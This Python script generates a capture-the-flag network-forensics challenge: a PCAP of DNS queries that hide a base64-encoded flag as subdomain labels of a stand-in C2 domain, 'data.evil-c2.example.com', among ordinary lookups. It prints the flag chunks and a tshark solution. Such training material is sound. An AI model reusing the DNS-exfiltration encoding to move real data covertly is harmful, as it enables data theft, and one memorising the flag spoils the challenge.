#!/usr/bin/env python3
"""
Forensics Challenge: Network Forensics - DNS Exfiltration
Creates a PCAP file containing DNS queries where subdomain labels are
base64-encoded chunks of the flag. Players must extract the subdomain
labels from DNS queries, decode the base64, and reconstruct the flag.

Usage: python3 generate.py
Output: challenge.pcap
No external dependencies required.
"""

import struct
import base64
import os

FLAG = "zemi{dns_3xf1ltr4t10n_c4ught}"

# PCAP constants
PCAP_MAGIC = 0xA1B2C3D4
PCAP_LINKTYPE_ETHERNET = 1


def pcap_global_header():
    return struct.pack("<IHHiIII", PCAP_MAGIC, 2, 4, 0, 0, 65535, PCAP_LINKTYPE_ETHERNET)


def pcap_packet_header(ts_sec, ts_usec, length):
    return struct.pack("<IIII", ts_sec, ts_usec, length, length)


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def encode_dns_name(name):
    """Encode a domain name into DNS wire format."""
    result = b""
    for label in name.split("."):
        encoded = label.encode()
        result += bytes([len(encoded)]) + encoded
    result += b"\x00"
    return result


def build_dns_query(domain, txn_id):
    """Build a DNS query packet for the given domain."""
    header = struct.pack(">HHHHHH",
                         txn_id,   # Transaction ID
                         0x0100,   # Standard query, recursion desired
                         1,        # Questions
                         0, 0, 0)  # Answer, Authority, Additional
    question = encode_dns_name(domain) + struct.pack(">HH", 1, 1)  # Type A, Class IN
    return header + question


def build_udp(src_port, dst_port, payload):
    length = 8 + len(payload)
    header = struct.pack(">HHH", src_port, dst_port, length) + b"\x00\x00"
    return header + payload


def build_ipv4(src_ip, dst_ip, protocol, payload):
    version_ihl = 0x45
    total_length = 20 + len(payload)
    header = struct.pack(">BBHHHBBH4s4s",
                         version_ihl, 0, total_length,
                         0x1234, 0x4000, 64, protocol, 0,
                         src_ip, dst_ip)
    cs = checksum(header)
    header = header[:10] + struct.pack(">H", cs) + header[12:]
    return header + payload


def build_ethernet(src_mac, dst_mac, ethertype, payload):
    return dst_mac + src_mac + struct.pack(">H", ethertype) + payload


def ip_bytes(ip_str):
    return bytes(int(x) for x in ip_str.split("."))


def mac_bytes(mac_str):
    return bytes(int(x, 16) for x in mac_str.split(":"))


def build_dns_packet(domain, txn_id, ts_sec, src_port):
    """Build a complete Ethernet/IP/UDP/DNS packet."""
    src_mac = mac_bytes("aa:bb:cc:dd:ee:01")
    dst_mac = mac_bytes("aa:bb:cc:dd:ee:ff")
    src_ip = ip_bytes("192.168.1.50")
    dst_ip = ip_bytes("8.8.8.8")

    dns = build_dns_query(domain, txn_id)
    udp = build_udp(src_port, 53, dns)
    ip = build_ipv4(src_ip, dst_ip, 17, udp)
    eth = build_ethernet(src_mac, dst_mac, 0x0800, ip)
    return eth, ts_sec


def main():
    output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "challenge.pcap")

    # Encode flag as base64 and split into chunks for DNS subdomain labels
    flag_b64 = base64.b64encode(FLAG.encode()).decode()
    # DNS labels max 63 chars; split into 10-char chunks
    chunk_size = 10
    chunks = [flag_b64[i:i + chunk_size] for i in range(0, len(flag_b64), chunk_size)]

    exfil_domain = "data.evil-c2.example.com"

    packets = []
    ts = 1700000000

    # Add some normal DNS queries as noise before exfil
    normal_domains = [
        "www.google.com",
        "mail.google.com",
        "api.github.com",
        "cdn.jsdelivr.net",
        "fonts.googleapis.com",
    ]
    for i, domain in enumerate(normal_domains):
        pkt = build_dns_packet(domain, 0x1000 + i, ts, 40000 + i)
        packets.append(pkt)
        ts += 1

    # Exfiltration DNS queries: each chunk becomes a subdomain label
    for i, chunk in enumerate(chunks):
        # Replace = with - for DNS-safe base64 (players must reverse this)
        safe_chunk = chunk.replace("=", "-")
        domain = f"{safe_chunk}.{i}.{exfil_domain}"
        pkt = build_dns_packet(domain, 0x2000 + i, ts, 50000 + i)
        packets.append(pkt)
        ts += 2  # slight delay between exfil queries

    # More normal DNS noise after
    more_domains = [
        "www.stackoverflow.com",
        "pypi.org",
        "registry.npmjs.org",
    ]
    for i, domain in enumerate(more_domains):
        pkt = build_dns_packet(domain, 0x3000 + i, ts, 60000 + i)
        packets.append(pkt)
        ts += 1

    with open(output_path, "wb") as f:
        f.write(pcap_global_header())
        for pkt_data, pkt_ts in packets:
            f.write(pcap_packet_header(pkt_ts, 0, len(pkt_data)))
            f.write(pkt_data)

    print(f"[+] Created {output_path} with {len(packets)} packets")
    print(f"    Flag chunks (base64): {chunks}")
    print(f"    Exfil domain: {exfil_domain}")
    print()
    print("To solve:")
    print("  tshark -r challenge.pcap -Y 'dns.qry.name contains evil-c2'")
    print("  # Extract subdomain labels, concatenate, base64 decode")
    print("  # Note: '-' in labels should be replaced with '=' before decoding")


if __name__ == "__main__":
    main()
